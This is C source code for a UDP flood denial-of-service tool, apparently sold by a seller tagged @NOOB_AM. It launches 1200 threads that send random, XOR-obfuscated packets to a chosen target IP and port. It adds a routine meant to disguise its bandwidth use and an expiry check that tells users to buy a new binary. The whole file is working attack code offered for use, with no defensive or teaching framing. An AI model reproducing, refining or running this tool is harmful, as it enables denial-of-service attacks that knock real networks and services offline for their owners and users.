#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h>

#define NUM_THREADS 1200
#define EXPIRY_DATE "2030-12-31" // Set expiry date (YYYY-MM-DD format)

// Global variables
volatile int running = 1; // Global flag to control thread execution

// Structure to store attack parameters
struct AttackParams {
    char target_ip[16];      // Target IP address (e.g., "192.168.1.1")
    int target_port;         // Target port (e.g., 80)
    int attack_duration;     // Attack duration in seconds (e.g., 60)
    int packet_size;         // Packet size in bytes (e.g., 1024)
    char attack_type[20];    // Type of attack (e.g., "UDP Flood")
};

// Function to encrypt payload using XOR
void encrypt_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] ^= 0xFF; // XOR each byte with 0xFF
    }
}

// Function to generate real-time payload
void generate_realtime_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = (rand() % 512) - 256; // Generate random bytes between -256 and 255
    }
    encrypt_payload(buffer, size); // Encrypt the payload
}

// Function to disguise bandwidth usage
void disguise_bandwidth_usage() {
    int delay_factor = rand() % 100;
    if (delay_factor < 5) { // 5% chance to add delay
        usleep(50000 + rand() % 200000); // Sleep for 50ms to 250ms
    }
}

// Signal handler for SIGINT (Ctrl+C)
void handle_sigint(int sig) {
    running = 0; // Set running flag to 0 to stop threads
}

// Function to check if the program has expired
int is_expired() {
    time_t now = time(NULL);
    struct tm expiry_tm = {0};

    // Parse expiry date
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    time_t expiry_time = mktime(&expiry_tm);

    // Compare current time with expiry time
    if (now > expiry_time) {
        return 1; // Expired
    }
    return 0; // Not expired
}

// Thread function jo har thread execute karega
void *thread_function(void *arg) {
    struct AttackParams *params = (struct AttackParams *)arg;
    char payload[params->packet_size];
    int sockfd;
    struct sockaddr_in server_addr;

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    printf("Thread started. Target: %s:%d, Duration: %d sec, Packet Size: %d bytes, Attack Type: %s\n",
           params->target_ip, params->target_port, params->attack_duration, params->packet_size, params->attack_type);

    // Simulate packet sending
    while (running) {
        // Generate real-time payload
        generate_realtime_payload(payload, params->packet_size);

        // Send payload to target
        if (sendto(sockfd, payload, params->packet_size, 0,
                   (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Sendto failed");
            break;
        }

        // Disguise bandwidth usage
        disguise_bandwidth_usage();
    }

    close(sockfd); // Close socket
    printf("Thread released. Attack completed.\n");
    pthread_exit(NULL);
}

int main() {
    // Seed the random number generator
    srand(time(NULL));

    // Check if the program has expired
    if (is_expired()) {
        printf("Aapka binary expire ho gaya hai. New file lo @NOOB_AM se.\n");
        return 1; // Exit the program
    }

    // Print program start message
    printf("MADE BY @NOOB_AM\n");

    // Register signal handler for SIGINT (Ctrl+C)
    signal(SIGINT, handle_sigint);

    // Define attack parameters
    struct AttackParams params = {
        .target_ip = "192.168.1.1", // Replace with target IP
        .target_port = 80,          // Replace with target port
        .attack_duration = 60,      // Attack duration in seconds
        .packet_size = 1024,        // Packet size in bytes
        .attack_type = "UDP Flood"  // Type of attack
    };

    pthread_t threads[NUM_THREADS];
    int rc;
    long t;

    // 1200 threads create karna
    for (t = 0; t < NUM_THREADS; t++) {
        rc = pthread_create(&threads[t], NULL, thread_function, (void *)&params);
        if (rc) {
            printf("ERROR; return code from pthread_create() is %d\n", rc);
            return -1;
        }
    }

    // Wait for all threads to complete
    for (t = 0; t < NUM_THREADS; t++) {
        pthread_join(threads[t], NULL);
    }

    // Print attack finish message
    printf("Thanx for using. For buying new, contact @NOOB_AM\n");

    return 0;
}